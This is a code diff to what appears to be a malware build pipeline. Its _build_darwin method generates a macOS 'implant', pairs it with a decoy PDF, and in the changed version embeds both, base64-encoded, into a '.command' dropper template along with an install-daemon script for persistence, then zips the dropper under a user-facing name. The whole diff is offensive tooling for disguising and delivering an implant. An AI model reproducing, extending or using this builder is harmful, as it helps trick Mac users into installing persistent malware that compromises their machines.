@@ -312,34 +312,26 @@ class BuildPipeline:
 
     def _build_darwin(self, req: BuildRequest, doc: str, arch: str, workdir: Path) -> bytes:
         implant = self._generate("darwin", arch, "executable", req)
-        implant_path = workdir / "implant"
-        implant_path.write_bytes(implant)
-        implant_path.chmod(0o755)
         decoy_path = workdir / "decoy.pdf"
         decoy_path.write_bytes(minimal_pdf(req.doc_name))
 
-        app_dir = workdir / f"{req.naming['mac']} {self._current_suffix}.app"
-        subprocess.run(
-            [
-                "bash",
-                str(TEMPLATES / "mac" / "build_app.sh"),
-                str(app_dir),
-                req.naming["mac"],
-                str(decoy_path),
-                str(implant_path),
-            ],
-            capture_output=True,
-            text=True,
-            check=False,
+        template = (TEMPLATES / "mac" / "dropper.command.tmpl").read_text(encoding="utf-8")
+        source = (
+            template.replace("{{DOC}}", doc)
+            .replace("{{IMPLANT_B64}}", base64.b64encode(implant).decode())
+            .replace(
+                "{{INSTALL_DAEMON_B64}}",
+                base64.b64encode((TEMPLATES / "mac" / "install-daemon.sh").read_bytes()).decode(),
+            )
+            .replace("{{DECOY_B64}}", base64.b64encode(decoy_path.read_bytes()).decode())
         )
-        if not app_dir.is_dir():
-            raise BuildError("mac bundle assembly failed")
+        dropper_path = workdir / f"{req.naming['mac']} {self._current_suffix}.command"
+        dropper_path.write_text(source, encoding="utf-8")
+        dropper_path.chmod(0o755)
 
-        name = f"{req.naming['mac']}_{self._current_suffix}.app.zip"
+        name = f"{req.naming['mac']}_{self._current_suffix}.command.zip"
         with zipfile.ZipFile(self.artifacts_dir / name, "w", zipfile.ZIP_DEFLATED) as zf:
-            for path in sorted(app_dir.rglob("*")):
-                if path.is_file():
-                    zf.write(path, path.relative_to(workdir))
+            zf.write(dropper_path, arcname=f"{req.naming['mac']} {self._current_suffix}.command")
         return name.encode()
 
     # -- orchestration -------------------------------------------------------
